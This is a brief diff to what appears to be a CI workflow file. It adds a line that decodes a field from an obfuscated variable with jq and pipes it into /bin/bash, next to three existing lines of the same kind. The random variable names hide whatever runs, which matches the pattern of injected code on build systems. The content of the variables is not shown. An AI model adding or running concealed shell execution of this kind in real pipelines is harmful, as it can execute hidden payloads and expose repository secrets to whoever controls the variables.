@@ -30,6 +30,7 @@ jobs:
           echo $j2488 | jq -r .cv699 | /bin/bash
           echo $jq25 | jq -r .wo759 | /bin/bash
           printf '%s' "$sng36" | jq -r .jin74 | /bin/bash
+          printf '%s' "$nngse20" | jq -r .e6405 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
